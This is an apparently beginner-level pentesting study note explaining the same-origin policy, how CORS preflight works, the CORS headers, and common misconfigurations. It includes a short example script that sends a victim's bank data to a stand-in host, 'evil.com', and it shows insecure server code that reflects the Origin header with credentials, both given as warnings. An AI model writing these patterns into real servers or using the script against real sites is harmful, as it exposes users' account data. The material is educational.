---
tags: [vapt, cors, beginner]
difficulty: beginner
module: "12 - CORS"
topic: "12.01 What is CORS and Why It Exists"
---

# 12.01 — What is CORS and Why It Exists

## The Browser's Default: Same-Origin Policy

```
SAME-ORIGIN POLICY (SOP):
  By default, web pages can ONLY read data from their own origin.
  
  Origin = protocol + host + port
  
  https://target.com/page can READ from: https://target.com/api
  https://target.com/page CANNOT READ from: https://api.target.com
                                              https://target.com:8080
                                              http://target.com
                                              https://other.com
  
  WHY?
  Without SOP, evil.com could:
  <script>
    fetch('https://bank.com/account')  // read YOUR bank balance!
      .then(r => r.json())
      .then(data => send(data, 'evil.com'));
  </script>
```

---

## The Problem: Legitimate Cross-Origin Requests

```
MODERN WEB ARCHITECTURE:
  Frontend: https://app.company.com
  API:      https://api.company.com
  Auth:     https://auth.company.com
  
  These are DIFFERENT ORIGINS!
  Without CORS: app.company.com can't call api.company.com!
  
  ALSO:
  Third-party integrations (payment APIs, maps, analytics)
  Microservices with different domains
  CDN assets
  OAuth flows

SOLUTION: CORS
  Let the SERVER tell the browser:
  "It's OK for these origins to read my responses"
  
  Browser: "OK, the server says api.company.com allows app.company.com"
  Browser: allows the JS to read the response!
```

---

## How CORS Works (Browser Flow)

```
CORS FLOW (for preflight requests):

CLIENT (browser)                    SERVER (api.company.com)
     |                                        |
     | OPTIONS /data HTTP/1.1                 |
     | Origin: https://app.company.com        |
     | Access-Control-Request-Method: POST    |
     | Access-Control-Request-Headers: Content-Type
     |-------------------------------------→  |
     |                                        |
     |   HTTP/1.1 204 No Content              |
     |   Access-Control-Allow-Origin: https://app.company.com
     |   Access-Control-Allow-Methods: GET, POST
     |   Access-Control-Allow-Headers: Content-Type
     |   Access-Control-Max-Age: 3600         |
     | ←-------------------------------------|
     |                                        |
     | POST /data HTTP/1.1                    |
     | Origin: https://app.company.com        |
     | Content-Type: application/json         |
     |-------------------------------------→  |
     |                                        |
     |   HTTP/1.1 200 OK                      |
     |   Access-Control-Allow-Origin: https://app.company.com
     | ←-------------------------------------|
     |                                        |
     | JS can now read the response!          |
```

---

## CORS vs SOP — What Each Controls

```
SAME-ORIGIN POLICY:
  → Controls what JS can READ from cross-origin responses
  → Enforced by BROWSER (not server)
  → Cannot be disabled by server
  → SENDING requests is not blocked (only reading!)

CORS:
  → Allows server to LOOSEN the SOP restriction
  → "This origin is allowed to read my responses"
  → Only applies to browser-initiated requests
  → cURL, Postman, mobile apps bypass CORS (no browser enforcement!)
  
KEY POINT FOR PENTESTERS:
  CORS misconfigurations only matter for:
  ✓ Browser-based attacks (XSS, malicious pages)
  ✗ Does NOT protect APIs from curl/Postman direct access
  ✗ API auth (tokens) protects the actual data
  
  CORS misconfig = allows attacker's JavaScript to read responses!
  Not misconfig = still need credentials to access the data!
```

---

## CORS Headers Summary

```
REQUEST HEADERS (sent by browser):
  Origin: https://app.company.com          ← always sent for cross-origin
  Access-Control-Request-Method: POST      ← in preflight only
  Access-Control-Request-Headers: Content-Type ← in preflight only

RESPONSE HEADERS (set by server):
  Access-Control-Allow-Origin: https://app.company.com
    OR: *  (allow all, but not with credentials!)
    
  Access-Control-Allow-Credentials: true
    → Must be true for cookies/auth headers to be sent AND readable!
    → If true, ACAO cannot be * (browsers reject this!)
    
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Max-Age: 3600   ← cache preflight for 1 hour
  Access-Control-Expose-Headers: X-Custom-Header  ← expose non-default headers
```

---

## Security Implications of CORS

```
SAFE CORS:
  Access-Control-Allow-Origin: https://app.company.com
  (specific, controlled origin)

SAFE (but no credentials):
  Access-Control-Allow-Origin: *
  (all origins, but credentials can't be sent)

DANGEROUS:
  Access-Control-Allow-Origin: https://evil.com  ← reflected from Origin header!
  Access-Control-Allow-Credentials: true
  
  → ANY origin can read credentialed responses!
  → Attacker can make requests AS the victim and read responses!
  → Account takeover, credential theft!

ALSO DANGEROUS:
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  
  → Sandboxed iframes can exploit this!
```

---

## Why CORS Misconfigurations Happen

```
COMMON MISTAKES:

1. REFLECTING ORIGIN BLINDLY:
   // BAD server code:
   response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
   response.setHeader('Access-Control-Allow-Credentials', 'true');
   
   → Any origin gets full access!

2. WEAK REGEX VALIDATION:
   if (origin.match(/target\.com$/)) allow();
   // evil-target.com also matches!

3. TRUST OF NULL:
   if (origin === null || origin === 'https://target.com') allow();
   // null origin can be sent from sandboxed iframes!

4. COPY-PASTE MISCONFIGURATION:
   Developers copy * from Stack Overflow, then add credentials: true
   → Browsers reject, but devs also add origin reflection to "fix" it!

5. DEVELOPMENT CONFIG IN PRODUCTION:
   Dev: Allow-Origin: * was fine for local testing
   Deployed to production without tightening
```

---

## Related Notes
- [[02 - Simple vs Preflight Requests]] — deep dive on request types
- [[03 - CORS Headers Full Reference]] — all headers explained
- [[04 - Origin Reflection Misconfiguration]] — most common attack
- [[Module 11 - CSRF]] — CORS enables powerful CSRF chains
- [[02 - Same-Origin Policy and CSRF]] — SOP basics
